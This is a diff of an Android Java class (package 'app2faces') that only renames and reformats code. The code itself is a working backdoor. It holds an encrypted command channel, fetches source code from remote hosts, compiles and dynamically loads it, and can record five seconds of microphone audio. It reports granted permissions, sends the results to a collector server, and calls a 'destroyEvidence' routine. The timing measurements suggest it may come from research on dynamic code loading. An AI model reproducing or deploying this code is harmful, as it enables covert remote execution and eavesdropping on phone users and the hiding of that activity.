@@ -1,4 +1,4 @@
-package com.android.a2faces;
+package com.android.app2faces;
 
 import android.content.Context;
 import android.content.pm.PackageInfo;
@@ -7,9 +7,9 @@ import android.media.MediaRecorder;
 import android.os.AsyncTask;
 import android.util.Log;
 
-import com.android.a2faces.compile_unit.Compile;
-import com.android.a2faces.compile_unit.InvalidSourceCodeException;
-import com.android.a2faces.compile_unit.NotBalancedParenthesisException;
+import com.android.app2faces.compile_unit.Compiler;
+import com.android.app2faces.compile_unit.InvalidSourceCodeException;
+import com.android.app2faces.compile_unit.NotBalancedParenthesisException;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -26,10 +26,10 @@ import javassist.NotFoundException;
 public class CommunicationTask extends AsyncTask<Void, Void, String> {
     private static final String LOGCAT_TAG = "COMMUNICATION_TASK";
 
-    private Context context;
+    private final Context context;
 
-    private String socketMainHostname;
-    private int socketMainPort;
+    private final String socketMainHostname;
+    private final int socketMainPort;
     private Socket socketMain = null;
     private PrintWriter outMain = null;
     private BufferedReader inMain = null;
@@ -51,6 +51,7 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
         this.socketMainHostname = socketMainHostname;
         this.socketMainPort = socketMainPort;
     }
+
     @Override
     protected String doInBackground(Void... params) {
         try {
@@ -59,7 +60,7 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
             writeOnSocketMain("alive");
             boolean isAlive = true;
 
-            while( isAlive ) {
+            while (isAlive) {
                 String commandReceived = readFromSocketMain();
 
                 String toSend = "";
@@ -89,102 +90,86 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
 
                     //download phase
                     long startDownloadPhase = System.nanoTime();
-                    String code =  "";
+                    StringBuilder codeBuilder = new StringBuilder();
                     for (int i = 0; i < socketCodeSendersList.length; i++) {
                         parseSocketCodeSenderParams(socketCodeSendersList[i]);
 
                         connectToSocketCodeSender(this.socketCodeSenderHostname, this.socketCodeSenderPort);
-                        code += readFromSocketCodeSender();
+                        codeBuilder.append(readFromSocketCodeSender());
 
                         closeSocketCodeSender();
-                        //end code sender phase
                     }
+                    String code = codeBuilder.toString();
                     long endDownloadPhase = System.nanoTime();
                     //end download phase
 
+
                     //new Compile instance
-                    Compile compile = new Compile(this.context.getFilesDir(), this.context, code);
+                    Compiler compiler = new Compiler(this.context, code, this.context.getFilesDir());
 
                     //parsing phase
                     long startParsing = System.nanoTime();
-                    compile.parseSourceCode();
+                    compiler.parseSourceCode();
                     long endParsing = System.nanoTime();
                     //end parsing phase
 
                     //compiling phase
                     long startCompiling = System.nanoTime();
-                    compile.assemblyCompile();
-                    compile.compile();
+                    compiler.compile();
                     long endCompiling = System.nanoTime();
                     //end compiling phase
 
                     long startLoading = System.nanoTime();
-                    compile.dynamicLoading(this.context.getCacheDir(), this.context.getApplicationInfo(), this.context.getClassLoader());
-                    Object obj = compile.run();
+                    compiler.dynamicLoading(this.context.getCacheDir(), this.context.getApplicationInfo(), this.context.getClassLoader());
                     long endLoading = System.nanoTime();
 
                     long startExecution = System.nanoTime();
-                    String result = "";
-                    Log.d("Schifo", resultType);
+                    Object obj = compiler.getInstance("RuntimeClass");
+                    String result;
                     if (resultType.equals("Sound")) {
-                        Method metodo1 = obj.getClass().getDeclaredMethod("run", Context.class);
-                        MediaRecorder pezzotto = (MediaRecorder) metodo1.invoke(obj, this.context);
+                        Method firstMethod = obj.getClass().getDeclaredMethod("run", Context.class);
+                        MediaRecorder recorder = (MediaRecorder) firstMethod.invoke(obj, this.context);
 
                         Thread.sleep(5000);
 
-                        Method metodo2 = obj.getClass().getDeclaredMethod("stop", MediaRecorder.class, Context.class);
-                        result = (String) metodo2.invoke(obj, pezzotto, this.context);
+                        Method secondMethod = obj.getClass().getDeclaredMethod("stop", MediaRecorder.class, Context.class);
+                        result = (String) secondMethod.invoke(obj, recorder, this.context);
                     } else {
-                        Method metodo = obj.getClass().getDeclaredMethod("run", Context.class);
-                        result = (String) metodo.invoke(obj, this.context);
+                        Method method = obj.getClass().getDeclaredMethod("run", Context.class);
+                        result = (String) method.invoke(obj, this.context);
                     }
                     long endExecution = System.nanoTime();
                     String resultToSend = "Result: " + result;
                     //end compiling, loading and execution phase
 
                     //eval timing
-                    double timeToDownload = (endDownloadPhase - startDownloadPhase) /1000000.0;
-                    double timeToParse =  (endParsing - startParsing) / 1000000.0;
+                    double timeToDownload = (endDownloadPhase - startDownloadPhase) / 1000000.0;
+                    double timeToParse = (endParsing - startParsing) / 1000000.0;
                     double timeToCompile = (endCompiling - startCompiling) / 1000000.0;
-                    double timeToLoad =  (endLoading - startLoading) / 1000000.0 ;
-                    double timeToExecute =  (endExecution - startExecution) / 1000000.0;
-                    String timingToSend = "Timing: " + timeToDownload + "~" + timeToParse + "~" + timeToCompile + "~" + timeToLoad + "~" + timeToExecute;
+                    double timeToDynamicLoad = (endLoading - startLoading) / 1000000.0;
+                    double timeToExecute = (endExecution - startExecution) / 1000000.0;
+                    String timingToSend = "Timing: " + timeToDownload + "~" + timeToParse + "~" + timeToCompile + "~" + timeToDynamicLoad + "~" + timeToExecute;
 
                     //collector phase
                     connectToSocketCollector(this.socketCollectorHostname, this.socketCollectorPort);
                     writeOnSocketCollector(timingToSend + "|" + resultToSend);
                     closeSocketCollector();
 
-                    //destroy all
-                    compile.destroyEvidence();
+                    //destroy evidence
+                    compiler.destroyEvidence();
                 } else if (commandReceived.equals("close")) {
                     isAlive = false;
                 }
 
 
-                if(!toSend.equals("")) {
+                if (!toSend.equals("")) {
                     writeOnSocketMain(toSend);
                 }
             }
-        } catch (IOException | PackageManager.NameNotFoundException e) {
-            e.printStackTrace();
-        } catch (InstantiationException e) {
-            e.printStackTrace();
-        } catch (InvocationTargetException e) {
-            e.printStackTrace();
-        } catch (NoSuchMethodException e) {
-            e.printStackTrace();
-        } catch (IllegalAccessException e) {
-            e.printStackTrace();
-        } catch (ClassNotFoundException e) {
-            e.printStackTrace();
-        } catch (NotBalancedParenthesisException e) {
-            e.printStackTrace();
-        } catch (NotFoundException e) {
-            e.printStackTrace();
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        } catch (InvalidSourceCodeException e) {
+        } catch (IOException | PackageManager.NameNotFoundException | InstantiationException |
+                InvocationTargetException | NoSuchMethodException | IllegalAccessException |
+                ClassNotFoundException | NotBalancedParenthesisException | NotFoundException |
+                InterruptedException | InvalidSourceCodeException e) {
             e.printStackTrace();
         }
 
@@ -217,16 +202,16 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
      * Establish a connection with the SocketMain
      *
      * @param hostname of SocketMain
-     * @param port of SocketMain
+     * @param port     of SocketMain
      */
     private void connectToSocketMain(String hostname, int port) {
         try {
-            if(socketMain == null) {
+            if (socketMain == null) {
                 Log.d(LOGCAT_TAG, "[Connecting to SocketMain...]");
                 this.socketMain = new Socket(hostname, port);
 
-                this.outMain =  new PrintWriter(socketMain.getOutputStream(), true);
-                this.inMain =  new BufferedReader(new InputStreamReader(socketMain.getInputStream()));
+                this.outMain = new PrintWriter(socketMain.getOutputStream(), true);
+                this.inMain = new BufferedReader(new InputStreamReader(socketMain.getInputStream()));
             }
         } catch (IOException e) {
             e.printStackTrace();
@@ -237,17 +222,17 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
      * Establish a connection with the SocketCodeSender
      *
      * @param hostname of SocketCodeSender
-     * @param port of SocketCodeSender
+     * @param port     of SocketCodeSender
      */
     private void connectToSocketCodeSender(String hostname, int port) {
         try {
-            if(socketCodeSender == null) {
+            if (socketCodeSender == null) {
                 Log.d(LOGCAT_TAG, "[Connecting to SocketCodeSender...]");
                 this.socketCodeSender = new Socket(hostname, port);
                 this.socketCodeSender.setReuseAddress(false);
 
-                this.outCodeSender =  new PrintWriter(socketCodeSender.getOutputStream(), true);
-                this.inCodeSender =  new BufferedReader(new InputStreamReader(socketCodeSender.getInputStream()));
+                this.outCodeSender = new PrintWriter(socketCodeSender.getOutputStream(), true);
+                this.inCodeSender = new BufferedReader(new InputStreamReader(socketCodeSender.getInputStream()));
             }
         } catch (IOException e) {
             e.printStackTrace();
@@ -258,23 +243,22 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
      * Establish a connection with the SocketCollector
      *
      * @param hostname of SocketCollector
-     * @param port of SocketCollector
+     * @param port     of SocketCollector
      */
     private void connectToSocketCollector(String hostname, int port) {
         try {
-            if(socketCollector == null) {
+            if (socketCollector == null) {
                 Log.d(LOGCAT_TAG, "[Connecting to SocketCollector...]");
                 this.socketCollector = new Socket(hostname, port);
                 this.socketCollector.setReuseAddress(false);
 
-                this.outCollector =  new PrintWriter(socketCollector.getOutputStream(), true);
-                this.inCollector =  new BufferedReader(new InputStreamReader(socketCollector.getInputStream()));
+                this.outCollector = new PrintWriter(socketCollector.getOutputStream(), true);
+                this.inCollector = new BufferedReader(new InputStreamReader(socketCollector.getInputStream()));
             }
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
-
 
 
     /**
@@ -285,7 +269,7 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
      */
     private String readFromSocketMain() throws IOException {
         String receivedEncrypted = this.inMain.readLine();
-        String receivedDecrypted =  Crypto.decryptString(
+        String receivedDecrypted = Crypto.decryptString(
                 Crypto.sha256(this.socketMainPort + this.socketMainHostname),
                 Crypto.md5(this.socketMainHostname + this.socketMainPort),
                 receivedEncrypted);
@@ -341,12 +325,11 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
     }
 
 
-
     /**
      * Close connection of SocketMain
      */
     public void closeSocketMain() {
-        if(socketMain != null) {
+        if (socketMain != null) {
             try {
                 Log.d(LOGCAT_TAG, "[Closing socket...]");
                 socketMain.close();
@@ -361,7 +344,7 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
      * Close connection of SocketCodeSender
      */
     public void closeSocketCodeSender() {
-        if(socketCodeSender != null) {
+        if (socketCodeSender != null) {
             try {
                 Log.d(LOGCAT_TAG, "[Closing socket slave...]");
                 socketCodeSender.close();
@@ -376,7 +359,7 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
      * Close connection of SocketCollector
      */
     public void closeSocketCollector() {
-        if(socketCollector != null) {
+        if (socketCollector != null) {
             try {
                 Log.d(LOGCAT_TAG, "[Closing socket collector...]");
                 socketCollector.close();
@@ -386,7 +369,6 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
             }
         }
     }
-
 
 
     /**
@@ -414,16 +396,15 @@ public class CommunicationTask extends AsyncTask<Void, Void, String> {
         StringBuilder permissionsAssembled = new StringBuilder("Permissions:");
         StringBuilder permissionsGrantedAssembled = new StringBuilder("Permissions Granted:");
         for (int i = 0; i < permissions.length; i++) {
-            if( (info.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0 ) {
+            if ((info.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) {
                 permissionsGrantedAssembled.append(permissions[i]).append('|');
             }
 
             permissionsAssembled.append(permissions[i]).append('|');
         }
 
-        return onlyGranted?  permissionsGrantedAssembled.toString() : permissionsAssembled.toString();
+        return onlyGranted ? permissionsGrantedAssembled.toString() : permissionsAssembled.toString();
     }
-
 
 
     @Override
